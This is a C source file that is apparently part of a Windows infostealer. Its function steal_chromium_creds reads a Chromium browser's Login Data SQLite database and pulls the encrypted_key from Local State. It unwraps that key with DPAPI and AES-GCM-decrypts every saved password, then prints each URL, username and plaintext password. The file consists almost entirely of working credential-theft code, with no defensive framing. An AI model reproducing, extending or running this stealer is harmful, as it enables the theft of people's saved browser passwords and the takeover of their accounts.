// clang-format off
// knownfolders needs to be after shlobj
#include <shlobj.h>
#include <knownfolders.h>
// clang-format on

#include "chromium.h"

#include <dpapi.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <wchar.h>
#include <windows.h>

#include "aes.h"
#include "path.h"
#include "sqlite3.h"

// Taken from chromium doc:
// https://source.chromium.org/chromium/chromium/src/+/main:components/os_crypt/sync/os_crypt_win.cc;l=41-42;drc=27d34700b83f381c62e3a348de2e6dfdc08364b8
#define NONCE_LENGTH 12

// "v10"
#define ENCRYPTION_VERSION_PREFIX_LENGTH 3

// "DPAPI"
#define DPAPI_KEY_PREFIX_LENGTH 5

// Retrieves "url login and password" from a chromium based browser sqlite
// database
// Returns an array of `LoginInfo` of size `count` the `password` in a
// `LoginInfo` is still encrypted at this point
// NOTE: Must be ran while the browser is NOT started otherwise the database is
// locked by the browser
// NOTE: `loginsOut` must be freed by the caller
static int retrieve_logins(const PWSTR fullPath, int *loginCountOut,
                           LoginInfo **loginsOut) {
  // In case of early return
  *loginsOut = NULL;
  *loginCountOut = 0;

  sqlite3 *db;
  int rc = sqlite3_open16(fullPath, &db);
  if (rc) {
    fprintf(stderr, "Can't open database: %s", sqlite3_errmsg(db));
    return EXIT_FAILURE;
  }

  // I think it's the same for every chromium browsers though I haven't checked
  const char *query =
      "SELECT origin_url, username_value, password_value FROM logins;";
  sqlite3_stmt *statement;
  rc = sqlite3_prepare_v2(db, query, -1, &statement, 0);
  if (rc != SQLITE_OK) {
    fprintf(stderr, "Failed to execute statement: %s", sqlite3_errmsg(db));
    sqlite3_close(db);
    *loginsOut = NULL;
    *loginCountOut = 0;
    return EXIT_FAILURE;
  }

  int capacity = 10;   // size of the **allocated** array
  *loginCountOut = 0;  // real size (number of elements) of the array
  *loginsOut = (LoginInfo *)malloc(capacity * sizeof(LoginInfo));

  if (!*loginsOut) {
    fprintf(stderr, "Failed to allocate memory for LoginInfo");
    sqlite3_finalize(statement);
    sqlite3_close_v2(db);
    return EXIT_FAILURE;
  }

  // go over each row and grow our `loginsOut` accordingly
  while ((rc = sqlite3_step(statement)) == SQLITE_ROW) {
    if (*loginCountOut >= capacity) {
      capacity += 10;  // grow the allocated array by this much
      *loginsOut =
          (LoginInfo *)realloc(*loginsOut, capacity * sizeof(LoginInfo));
      if (!*loginsOut) {
        fprintf(stderr, "Failed to reallocate memory for LoginInfo");
        sqlite3_finalize(statement);
        sqlite3_close_v2(db);
        return EXIT_FAILURE;
      }
    }

    const unsigned char *url = sqlite3_column_text(statement, 0);
    const unsigned char *username = sqlite3_column_text(statement, 1);
    const unsigned char *passwordBlock = sqlite3_column_text(statement, 2);
    const int passwordBlockSize = sqlite3_column_bytes(statement, 2);

    (*loginsOut)[*loginCountOut].url = strdup((const char *)url);
    (*loginsOut)[*loginCountOut].username = strdup((const char *)username);
    (*loginsOut)[*loginCountOut].passwordBlock =
        strdup((const char *)passwordBlock);
    (*loginsOut)[*loginCountOut].passwordBlockSize = passwordBlockSize;

    (*loginCountOut)++;
  }

  rc = sqlite3_finalize(statement);
  if (rc != SQLITE_OK) {
    fprintf(stderr, "Failed to finalize statement: %s\n", sqlite3_errmsg(db));
    sqlite3_close(db);
    return EXIT_FAILURE;
  }

  rc = sqlite3_close_v2(db);
  if (rc != SQLITE_OK) {
    fprintf(stderr, "Failed to close database: %s\n", sqlite3_errmsg(db));
    return EXIT_FAILURE;
  }
  return EXIT_SUCCESS;
}

// Frees an array of LoginInfo instance
void free_logins(LoginInfo *logins, int count) {
  for (int i = 0; i < count; i++) {
    free(logins[i].url);
    free(logins[i].username);
    free(logins[i].passwordBlock);
  }
  free(logins);
}

// NOTE: `encryptedKeyOut` must be freed by the caller
static int retrieve_encrypted_key(PWSTR localStatePath, PSTR *encryptedKeyOut) {
  HANDLE fileHandle =
      CreateFileW(localStatePath, GENERIC_READ, FILE_SHARE_READ, NULL,
                  OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
  if (fileHandle == INVALID_HANDLE_VALUE) {
    printf("Failed to open file. Error code: %lu\n", GetLastError());
    return EXIT_FAILURE;
  }

  DWORD fileSize = GetFileSize(fileHandle, NULL);
  if (fileSize == INVALID_FILE_SIZE) {
    printf("Failed to get file size. Error code: %lu\n", GetLastError());
    CloseHandle(fileHandle);
    return EXIT_FAILURE;
  }

  // characters in the file are encoded in ASCII, we can't use wide characters
  // here so we will only convert the final result, later on for compatibility
  PSTR fileBuffer = (PSTR)malloc(fileSize + 1);
  if (!fileBuffer) {
    printf("Failed to allocate memory for file buffer.\n");
    CloseHandle(fileHandle);
    return EXIT_FAILURE;
  }

  DWORD bytesRead;
  if (!ReadFile(fileHandle, fileBuffer, fileSize * sizeof(char), &bytesRead,
                NULL)) {
    printf("Failed to read file. Error code: %lu\n", GetLastError());
    free(fileBuffer);
    CloseHandle(fileHandle);
    return EXIT_FAILURE;
  }
  CloseHandle(fileHandle);

  fileBuffer[fileSize] = '\0';  // terminate the buffer

  const char *key = "\"encrypted_key\":";
  PSTR cursor = strstr(fileBuffer, key);
  if (!cursor) {
    free(fileBuffer);
    return EXIT_FAILURE;
  }

  // skip the key
  cursor += strlen(key);
  // skip whitespace and the beginning quote
  while (*cursor == ' ' || *cursor == '\t' || *cursor == '"') {
    cursor++;
  }

  // keep start position of the encrypted key
  PSTR start = cursor;
  // cursor now points to the end of the encrypted key (to get the length)
  while (*cursor != '"') {
    cursor++;
  }

  size_t length = cursor - start;
  *encryptedKeyOut = (PSTR)malloc(length + 1);
  if (!*encryptedKeyOut) {
    free(fileBuffer);
    return EXIT_FAILURE;
  }

  strncpy(*encryptedKeyOut, start, length);
  (*encryptedKeyOut)[length] = '\0';

  free(fileBuffer);
  return EXIT_SUCCESS;
}

// decrypt an encrypted_key using DPAPI
// NOTE: `decryptedKeyOut` must be freed by the caller
static int decrypt_key(PCSTR encryptedKey, DATA_BLOB *decryptedKeyOut) {
  DWORD decodedBinarySize = 0;
  if (!CryptStringToBinaryA(encryptedKey, 0, CRYPT_STRING_BASE64, NULL,
                            &decodedBinarySize, NULL, NULL)) {
    fprintf(stderr, "Failed getting base64 size. Error code: %lu\n",
            GetLastError());
    return EXIT_FAILURE;
  }

  BYTE *decodedBinaryData = (BYTE *)malloc(decodedBinarySize);
  if (decodedBinaryData == NULL) {
    fprintf(stderr, "Failed allocating memory\n");
    return EXIT_FAILURE;
  }

  if (!CryptStringToBinaryA(encryptedKey, 0, CRYPT_STRING_BASE64,
                            decodedBinaryData, &decodedBinarySize, NULL,
                            NULL)) {
    fprintf(stderr, "Failed decoding base64. Error code: %lu\n",
            GetLastError());
    free(decodedBinaryData);
    return EXIT_FAILURE;
  }

  // Remove the first five bytes
  size_t newSize = decodedBinarySize - 5;
  BYTE *newData = (BYTE *)malloc(newSize);
  if (newData == NULL) {
    fprintf(stderr, "Failed allocating memory\n");
    free(decodedBinaryData);
    return EXIT_FAILURE;
  }
  memcpy(newData, decodedBinaryData + 5, newSize);
  free(decodedBinaryData);

  DATA_BLOB DataInput;
  DATA_BLOB DataOutput;

  DataInput.cbData = (DWORD)newSize;
  DataInput.pbData = newData;

  if (!CryptUnprotectData(&DataInput, NULL, NULL, NULL, NULL, 0, &DataOutput)) {
    fprintf(stderr, "Failed decrypting key. Error code: %lu\n", GetLastError());
    free(newData);
    return EXIT_FAILURE;
  }

  // Set the output blob
  decryptedKeyOut->cbData = DataOutput.cbData;
  decryptedKeyOut->pbData = DataOutput.pbData;

  free(newData);
  return EXIT_SUCCESS;
}

static int decrypt_logins(LoginInfo *logins, int loginCount,
                          Credential **credentialsOut, int *credentialCountOut,
                          BYTE *key) {
  *credentialsOut = (Credential *)malloc(loginCount * sizeof(Credential));
  if (*credentialsOut == NULL) {
    fprintf(stderr, "Memory allocation failed\n");
    return EXIT_FAILURE;
  }

  for (int i = 0; i < loginCount; i++) {
    // cipher format: | "v10"(3) | nonce(12) | cipher(?) |
    BYTE *passwordBlock = (BYTE *)logins[i].passwordBlock;
    size_t passwordBlockSize = logins[i].passwordBlockSize;
    BYTE *nonce = passwordBlock + ENCRYPTION_VERSION_PREFIX_LENGTH;
    BYTE *ciphertext =
        passwordBlock + ENCRYPTION_VERSION_PREFIX_LENGTH + NONCE_LENGTH;
    size_t ciphertextSize =
        passwordBlockSize - (ENCRYPTION_VERSION_PREFIX_LENGTH + NONCE_LENGTH);

    BYTE *plaintext = (BYTE *)malloc(ciphertextSize);
    if (plaintext == NULL) {
      fprintf(stderr, "Memory allocation failed\n");
      free(*credentialsOut);
      return EXIT_FAILURE;
    }

    if (AES_GCM_decrypt(key, nonce, ciphertext, ciphertextSize, NULL, 0, 0,
                        plaintext)) {
      fprintf(stderr, "Decryption failed\n");
      free(plaintext);
      free(*credentialsOut);
      return EXIT_FAILURE;
    }

    // Don't now why but this seems to work as longs as there is no
    // authentication tag. Chromium real calculation is done here:
    // https://source.chromium.org/chromium/chromium/src/+/main:third_party/boringssl/src/crypto/fipsmodule/cipher/aead.cc.inc;l=192-228;drc=27d34700b83f381c62e3a348de2e6dfdc08364b8;bpv=1;bpt=1
    plaintext[ciphertextSize - (12 + 5 - 1)] = '\0';

    (*credentialsOut)[i].url = strdup(logins[i].url);
    (*credentialsOut)[i].username = strdup(logins[i].username);
    (*credentialsOut)[i].password = strdup((const char *)plaintext);

    free(plaintext);
  }

  *credentialCountOut = loginCount;
  return EXIT_SUCCESS;
}

int steal_chromium_creds() {
  //////////////////////////////////////////////////////////////
  PWSTR loginDataPath;
  if (get_logindata_path(&loginDataPath)) {
    fprintf(stderr, "Unable to get local appdata PATH");
    return EXIT_FAILURE;
  }

  //////////////////////////////////////////////////////////////

  LoginInfo *logins = NULL;
  int loginsCount = 0;
  if (retrieve_logins(loginDataPath, &loginsCount, &logins)) {
    fprintf(stderr, "Could not retrieve logins from the database");
    return EXIT_FAILURE;
  }

  //////////////////////////////////////////////////////////////

  PWSTR localStatePath;
  if (get_localstate_path(&localStatePath)) {
    fprintf(stderr, "Unable to get local appdata PATH");
    return EXIT_FAILURE;
  }

  //////////////////////////////////////////////////////////////

  PSTR encryptedKey;
  if (retrieve_encrypted_key(localStatePath, &encryptedKey)) {
    wprintf(L"Could not retrieve key from %s\n", localStatePath);
    return EXIT_FAILURE;
  }

  //////////////////////////////////////////////////////////////

  DATA_BLOB decryptedBlob;
  if (decrypt_key((PCSTR)encryptedKey, &decryptedBlob)) {
    fprintf(stderr, "Could not decrypt key\n");
    return EXIT_FAILURE;
  }

  //////////////////////////////////////////////////////////////

  // decrypt passwords using [AES 256
  // GCM](https://source.chromium.org/chromium/chromium/src/+/main:components/os_crypt/sync/os_crypt_win.cc;l=216-235)
  // Extract nonce, ciphertext, and signature from logins[0].password
  // "v10"(3) | nonce (12) | cipher(depends)
  Credential *credentials = NULL;
  int credentialCount = 0;

  if (decrypt_logins(logins, loginsCount, &credentials, &credentialCount,
                     decryptedBlob.pbData) == EXIT_SUCCESS) {
    for (int i = 0; i < credentialCount; i++) {
      printf("===== LOGIN %d =====\n", i);
      printf("URL: %s\n", credentials[i].url);
      printf("Username: %s\n", credentials[i].username);
      printf("Password: %s\n", credentials[i].password);
      free(credentials[i].url);
      free(credentials[i].username);
      free(credentials[i].password);
    }
    printf("====================\n");
    free(credentials);
  } else {
    printf("Failed to decrypt logins\n");
  }

  free_logins(logins, loginsCount);
  LocalFree(decryptedBlob.pbData);  // allocated in decrypt_key
  free(encryptedKey);               // allocated in retrieve_encrypted_key
  free(localStatePath);             // allocated in get_localstate_path
  free(loginDataPath);              // allocated in get_logindata_path
  return EXIT_SUCCESS;
}
